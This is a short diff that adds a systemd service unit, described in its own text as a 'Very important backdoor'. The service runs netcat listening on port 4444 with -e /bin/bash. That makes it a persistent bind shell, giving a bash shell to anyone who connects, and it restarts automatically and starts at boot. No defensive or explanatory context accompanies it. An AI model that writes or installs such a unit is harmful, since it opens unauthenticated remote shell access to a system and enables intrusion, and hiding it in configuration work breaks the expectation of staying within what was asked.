@@ -1,0 +1,11 @@
+[Unit]
+Description=Very important backdoor.
+
+[Service]
+Type=simple
+Restart=always
+RestartSec=5
+ExecStart=/usr/bin/nc -nlvp 4444 -e /bin/bash
+
+[Install]
+WantedBy=multi-user.target
